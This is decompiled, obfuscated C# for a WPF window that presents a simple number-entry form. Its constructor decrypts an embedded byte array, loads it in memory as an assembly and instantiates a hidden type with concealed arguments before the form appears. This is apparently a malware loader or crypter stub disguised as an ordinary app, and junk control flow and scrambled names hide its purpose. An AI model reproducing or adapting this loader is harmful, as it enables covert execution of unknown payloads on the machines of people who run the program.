using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Reflection;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Markup;

namespace F0;

public class Ew : Window, IComponentConnector
{
	internal TextBox box;

	private bool hgr;

	internal static Ew Kr;

	private Assembly Rgv(object object_0)
	{
		return Assembly.Load((byte[])object_0);
	}

	public Ew()
	{
		Rg.XRF6rz();
		((Window)this)._002Ector();
		Assembly assembly = Rgv(S3.tl((byte[])Uh(), Encoding.Default.GetBytes(sE.znu(406))));
		Type type = assembly.GetTypes()[1];
		string[] array = S3.GID.Split(new char[1] { '~' });
		object[] args = new object[3]
		{
			array[0],
			array[1],
			sE.znu(454)
		};
		Activator.CreateInstance(type, args);
		InitializeComponent();
	}

	private void Ggt(object sender, MouseButtonEventArgs e)
	{
		if (box.get_Text() == (string?)B3(494))
		{
			box.set_Text("");
		}
	}

	private void CgM(object sender, RoutedEventArgs e)
	{
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (int.Parse(box.get_Text()) > 0)
			{
				Dd dd = new Dd(int.Parse(box.get_Text()));
				((Window)dd).Show();
				Hy(this);
				return;
			}
			box.set_Text((string)B3(522));
			int num = 0;
			if (AH() != null)
			{
				int num2 = default(int);
				num = num2;
			}
			switch (num)
			{
			}
			MessageBox.Show((string)B3(550));
		}
		catch (Exception ex)
		{
			box.set_Text(sE.znu(522));
			MessageBox.Show(ex.Message);
		}
	}

	private void LgL(object sender, KeyEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		if ((int)e.get_Key() != 6)
		{
			return;
		}
		try
		{
			if (int.Parse(box.get_Text()) > 0)
			{
				Dd dd = new Dd(int.Parse(box.get_Text()));
				((Window)dd).Show();
				((Window)this).Close();
				return;
			}
			box.set_Text(sE.znu(522));
			Ya(sE.znu(550));
			int num = 0;
			if (!H6())
			{
				int num2 = default(int);
				num = num2;
			}
			switch (num)
			{
			}
		}
		catch (Exception ex)
		{
			box.set_Text(sE.znu(522));
			MessageBox.Show(ex.Message);
		}
	}

	[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
	[DebuggerNonUserCode]
	public void InitializeComponent()
	{
		if (!hgr)
		{
			hgr = true;
			Uri uri = new Uri(sE.znu(638), UriKind.Relative);
			Application.LoadComponent((object)this, uri);
			int num = 0;
			if (AH() != null)
			{
				int num2 = default(int);
				num = num2;
			}
			switch (num)
			{
			}
		}
	}

	[DebuggerNonUserCode]
	[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
	[EditorBrowsable(EditorBrowsableState.Never)]
	void IComponentConnector.Connect(int connectionId, object target)
	{
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Expected O, but got Unknown
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0067: Expected O, but got Unknown
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a7: Expected O, but got Unknown
		int num;
		switch (connectionId)
		{
		default:
			num = 1;
			if (!H6())
			{
				goto IL_0078;
			}
			goto IL_0087;
		case 1:
			((UIElement)(Ew)target).add_KeyDown(new KeyEventHandler(LgL));
			break;
		case 2:
			box = (TextBox)target;
			((UIElement)box).add_PreviewMouseLeftButtonUp(new MouseButtonEventHandler(Ggt));
			num = 0;
			if (!H6())
			{
				int num2 = default(int);
				num = num2;
			}
			goto IL_0078;
		case 3:
			{
				((ButtonBase)(Button)target).add_Click(new RoutedEventHandler(CgM));
				break;
			}
			IL_0087:
			hgr = true;
			break;
			IL_0078:
			switch (num)
			{
			default:
				return;
			case 1:
				break;
			case 0:
				return;
			}
			goto IL_0087;
		}
	}

	internal static bool H6()
	{
		return Kr == null;
	}

	internal static Ew AH()
	{
		return Kr;
	}

	internal static object Uh()
	{
		return h8.s4();
	}

	internal static object B3(int int_0)
	{
		return sE.znu(int_0);
	}

	internal static void Hy(object object_0)
	{
		((Window)object_0).Close();
	}

	internal static MessageBoxResult Ya(object object_0)
	{
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		return MessageBox.Show((string)object_0);
	}
}
